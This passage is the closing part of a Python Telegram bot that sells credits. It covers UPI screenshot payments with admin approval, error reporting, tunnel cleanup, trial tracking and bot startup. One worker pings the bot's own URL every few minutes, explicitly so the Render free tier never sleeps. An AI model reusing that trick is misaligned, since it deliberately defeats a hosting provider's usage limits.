                ctx.user_data.pop("await", None); ctx.user_data.pop("buy", None)
                return
            fid = msg.photo[-1].file_id
            pid = None
            try:
                with DB_LOCK:
                    c.execute("INSERT INTO payments(user_id,credits,price,ref,screenshot,ts) VALUES(?,?,?,?,?,?)",
                              (int(u.id), cred, price, "-", fid, now()))
                    pid = c.lastrowid
                    conn.commit()
                log("payment created pid=" + str(pid))
            except Exception as e:
                err_msg = str(e)[:200]
                record_error("payment insert", e)
                await msg.reply_text(wrap("❌ DB error\n📝 " + err_msg + "\n🔄 Try again"), parse_mode="HTML")
                return
            caption = ("<blockquote>" + bi("💸 New payment request\n"
                       "👤 @" + str(u.username or "unknown") + " · id " + str(u.id) + "\n"
                       "💰 " + str(cred) + " credit · ₹" + str(price) + "\n"
                       "📷 Screenshot below") + "</blockquote>\n\n"
                       "<blockquote>" + BRAND + "</blockquote>")
            admin_sent = False
            try:
                await ctx.bot.send_photo(ADMIN_ID, fid, caption=caption, parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [B("✅ Approve", "pay:ok:" + str(pid), style="success"),
                         B("❌ Reject",  "pay:no:" + str(pid), style="danger")]]))
                admin_sent = True
                log("payment forwarded pid=" + str(pid))
            except Exception as e:
                record_error("admin photo send", e)
                notify_admin("Payment upload FAIL: " + str(e)[:120])
            if admin_sent:
                await msg.reply_text(wrap("🧾 Payment request received\n"
                    "⏱️ Admin approval ka wait karo\n"
                    "💬 Approve ya reject ka msg aayega"), parse_mode="HTML")
            else:
                await msg.reply_text(wrap("⚠️ Admin ko forward nahi ho paya\n💬 DM @RehanCodex"), parse_mode="HTML")
            ctx.user_data.pop("await", None)
            ctx.user_data.pop("buy", None)
            return

        log("!! unhandled media await_=" + str(await_))
    except Exception as e:
        record_error("on_media", e)


# ═══════════ SELFTEST + MAIN ═══════════
async def global_error_handler(update, context):
    try:
        import traceback
        err = context.error
        errstr = str(err).lower()
        if "readerror" in errstr or "timed out" in errstr:
            return
        if "conflict" in errstr or "terminated by other" in errstr:
            log("! conflict detected — another instance running?")
            return
        if "connection" in errstr and "reset" not in errstr:
            return
        record_error("global", err)
        tb = traceback.format_exc()
        log("!! global err: " + str(err)[:200])
        try:
            err_id = gen_id(6)
            err_text = "🐞 Error Report\n" \
                       "🆔 ID: #" + err_id + "\n" \
                       "📅 " + now() + "\n" \
                       "❌ " + str(err)[:300]
            tb_short = tb[-1500:] if len(tb) > 1500 else tb
            full = "<blockquote>" + bi(err_text) + "</blockquote>\n\n" \
                   "<blockquote><code>" + esc(tb_short) + "</code></blockquote>\n\n" \
                   "<blockquote>" + BRAND + "</blockquote>"
            try:
                await context.bot.send_message(ADMIN_ID, full, parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [B("🐞 Error Log","a:errors", style="danger")]]))
            except Exception:
                try: await context.bot.send_message(ADMIN_ID, full, parse_mode="HTML")
                except Exception: pass
            set_setting("last_err_" + err_id, tb_short[:2000])
        except Exception: pass
        try:
            if update and hasattr(update, "effective_chat"):
                await context.bot.send_message(update.effective_chat.id,
                    "<blockquote>" + bi("⚠️ Error occurred\n🔧 Auto-fix in progress\n⏱️ Try again shortly") + "</blockquote>\n\n<blockquote>" + BRAND + "</blockquote>",
                    parse_mode="HTML")
        except Exception: pass
    except Exception: pass


def selftest():
    log("Python " + sys.version.split()[0])
    try:
        r = requests.get("https://api.telegram.org/bot"+BOT_TOKEN+"/getMe", timeout=10).json()
        if r.get("ok"): log("Token OK · @" + r["result"]["username"])
        else: log("Token FAIL"); return False
    except Exception as e:
        log("Token err: " + str(e)); return False
    return True


def _cleanup():
    log("shutting down...")
    try:
        if TUNNEL.get("proc"): TUNNEL["proc"].kill()
    except Exception: pass
    try: subprocess.run(["pkill","-9","-f","ssh.*lhr.life"], timeout=3, check=False)
    except Exception: pass
    try: subprocess.run(["pkill","-9","-f","cloudflared"], timeout=3, check=False)
    except Exception: pass


def _acquire_pid_lock():
    lock_path = os.path.expanduser("~/.rcx-bot.pid")
    try:
        if os.path.exists(lock_path):
            try:
                with open(lock_path) as f:
                    old_pid = int(f.read().strip())
                try:
                    os.kill(old_pid, 0)
                    try:
                        with open("/proc/%d/cmdline" % old_pid) as cf:
                            cmd = cf.read()
                        if "main.py" in cmd:
                            print("[RCX] !ERR Another bot instance running (pid %d)" % old_pid)
                            print("[RCX] !ERR Run: pkill -9 -f 'python.*main.py'")
                            return False
                    except Exception:
                        pass
                except OSError:
                    pass
            except Exception:
                pass
        with open(lock_path, "w") as f:
            f.write(str(os.getpid()))
        return True
    except Exception as e:
        print("[RCX] lock err:", e)
        return True


def _release_pid_lock():
    try:
        lock_path = os.path.expanduser("~/.rcx-bot.pid")
        if os.path.exists(lock_path):
            os.remove(lock_path)
    except Exception: pass


def self_ping_worker():
    """Ping own public URL every 5 min so Render free tier never sleeps."""
    time.sleep(120)  # wait for tunnel to come up
    log("\U0001F501 self-ping started (Render keep-alive)")
    while True:
        try:
            base = _try_env() or TUNNEL.get("url")
            if base:
                r = requests.get(base.rstrip("/") + "/", timeout=15)
                log("\U0001F501 self-ping " + str(r.status_code) + " " + base[:50])
            else:
                log("\U0001F501 self-ping skipped (no URL yet)")
        except Exception as e:
            log("\U0001F501 self-ping err: " + str(e)[:100])
        time.sleep(240)  # 4 min — under Render's 15 min sleep window


def _restricted_message():
    price = str(setting("access_price", "100"))
    lines = [
        "\U0001F512 Access restricted",
        "\U0001F3AF Free trial used up",
        "\U0001F4B0 " + price + " rs for full access",
        "\U0001F4DE Contact admin to buy",
        "\U0001F447 Tap DM Now to buy",
    ]
    return wrap("\n".join(lines))


def _restricted_kb(with_back=False):
    rows = [[B("\U0001F4AC DM Now", url="https://t.me/RehanCodex", style="success")]]
    if with_back:
        rows.append([B("\U0001F519 Back", "u:home", style="primary")])
    return InlineKeyboardMarkup(rows)


def _verify_url(url, timeout=12):
    if not url:
        return False
    try:
        r = requests.get(url.rstrip("/") + "/", timeout=timeout, allow_redirects=True)
        return r.status_code in (200, 301, 302, 404)
    except Exception:
        return False


def trial_week_status(uid):
    key = "trial_week_start_" + str(uid)
    raw = setting(key, "")
    if not raw:
        now_ts = int(time.time())
        set_setting(key, str(now_ts))
        return now_ts, False, 7
    try:
        start = int(raw)
    except Exception:
        start = int(time.time())
        set_setting(key, str(start))
    elapsed = int(time.time()) - start
    expired = elapsed > 7 * 86400
    days_left = max(0, 7 - (elapsed // 86400))
    return start, expired, days_left


def ensure_owner_credit():
    """Give owner 20 credit once, ever."""
    flag = "owner_welcome_paid_" + str(ADMIN_ID)
    if setting(flag, "") == "1":
        return
    upsert_user(ADMIN_ID, "owner")
    with DB_LOCK:
        c.execute("UPDATE users SET credits=credits+? WHERE id=?", (20, ADMIN_ID))
        c.execute("INSERT INTO tx(user_id,type,amount,note,ts) VALUES(?,?,?,?,?)",
                  (ADMIN_ID, "owner_welcome", 20, "first_run", now()))
        conn.commit()
    set_setting(flag, "1")
    log("owner welcome +20 credit")


def main():
    global PORT
    import signal
    signal.signal(signal.SIGINT, lambda s, f: (_cleanup(), _release_pid_lock(), os._exit(0)))
    signal.signal(signal.SIGTERM, lambda s, f: (_cleanup(), _release_pid_lock(), os._exit(0)))
    if not _acquire_pid_lock():
        print("[RCX] EXITING — another instance already running")
        return
    hosting = _is_hosting()
    if hosting:
        log("mode: HOSTING (env vars)")
    else:
        log("mode: TERMUX/LOCAL")
        _setup_fakeetc()
    if not selftest(): return
    init_db()
    ensure_owner_credit()
    if setting("access_price","") == "": set_setting("access_price", "100")
    if setting("access_days","") == "": set_setting("access_days", "30")
    if setting("min_buy_credit","") == "": set_setting("min_buy_credit", "50")
    if setting("upi_id","") == "": set_setting("upi_id", "sdaminun@fam")
    if setting("upi_qr","") == "": set_setting("upi_qr", "")
    if setting("min_buy_price","") == "": set_setting("min_buy_price", "50")
    if setting("free_daily","") == "": set_setting("free_daily", "1")
    if setting("auto_update_notify","") == "": set_setting("auto_update_notify", "1")
    if setting("linkowner_reward","") == "": set_setting("linkowner_reward", "20")
    if setting("welcome_bonus","") == "": set_setting("welcome_bonus", "20")
    if setting("welcome_bonus_on","") == "": set_setting("welcome_bonus_on", "1")
    log("db ready")
    if hosting:
        log("port: using env PORT=" + str(PORT))
    else:
        orig = PORT; picked = None
        for p in range(orig, orig + 60):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.bind((HOST, p)); s.close(); picked = p; break
            except OSError: s.close()
        if picked is None: log("no free port"); return
        if picked != orig: log("Port " + str(orig) + " busy — using " + str(picked))
        PORT = picked
    threading.Thread(target=run_flask, daemon=True).start()
    log("flask on :" + str(PORT))
    threading.Thread(target=tunnel_worker, daemon=True).start()
    threading.Thread(target=tunnel_watchdog, daemon=True).start()
    threading.Thread(target=access_expiry_watchdog, daemon=True).start()
    threading.Thread(target=self_ping_worker, daemon=True).start()
    app = (Application.builder()
            .token(BOT_TOKEN)
            .concurrent_updates(True)
            .build())
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("rehancodex", cmd_rehancodex))
    app.add_handler(CommandHandler("id", cmd_id))
    app.add_handler(CommandHandler("add", cmd_add))
    app.add_handler(CommandHandler("remove", cmd_remove))
    app.add_handler(CommandHandler("users", cmd_users))
    app.add_handler(CommandHandler("rehanroshni", cmd_rehanroshni))
    app.add_handler(CommandHandler("linkowner", cmd_linkowner))
    app.add_handler(CommandHandler("addcreditall", cmd_addcreditall))
    app.add_handler(CommandHandler("removecreditall", cmd_removecreditall))
    app.add_handler(CommandHandler("addcredit", cmd_addcredit))
    app.add_handler(CommandHandler("removecredit", cmd_removecredit))
    app.add_handler(CommandHandler("logs", cmd_logs))
    app.add_handler(CommandHandler("stars", cmd_stars))
    app.add_handler(CommandHandler("clearerr", cmd_clearerr))
    app.add_handler(CallbackQueryHandler(on_pay_cb, pattern=r"^pay:"))
    app.add_handler(CallbackQueryHandler(on_cb))
    app.add_handler(ChatJoinRequestHandler(on_join_req))
    app.add_handler(PreCheckoutQueryHandler(on_precheckout))
    app.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, on_stars_paid))
    app.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO | filters.ANIMATION | filters.Document.IMAGE, on_media))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    log("bot polling — /rehancodex /rehanroshni /id /add /remove /users /logs")
    app.add_error_handler(global_error_handler)
    app.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    try: asyncio.get_running_loop()
    except RuntimeError: asyncio.set_event_loop(asyncio.new_event_loop())
    main()
